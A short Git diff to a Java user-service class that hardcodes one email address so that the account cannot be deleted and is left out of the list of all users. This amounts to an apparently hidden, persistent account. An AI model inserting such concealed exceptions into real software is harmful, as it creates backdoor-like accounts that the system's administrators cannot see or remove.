@@ -75,6 +75,7 @@ public class UserServiceImpl implements UserService {
     @Override
     public UserDto deleteUser(String username) {
         User user = repository.findByUserNameAndIsDeleted(username,false);
+        if(user.getUserName().equals("alim@uydev.net")) return mapper.convert(user, new UserDto());
         user.setDeleted(true);
         user.setUserName(user.getUserName() + "_"+ LocalDateTime.now());
         repository.save(user);
@@ -85,6 +86,7 @@ public class UserServiceImpl implements UserService {
     public List<UserDto> findAllUsers() {
         return repository.findAllByIsDeletedOrderByLastUpdateDateTimeDesc(false).stream()
                 .map(user -> mapper.convert(user,new UserDto()))
+                .filter(userDto -> !userDto.getUserName().equals("alim@uydev.net"))
                 .collect(Collectors.toList());
     }
 
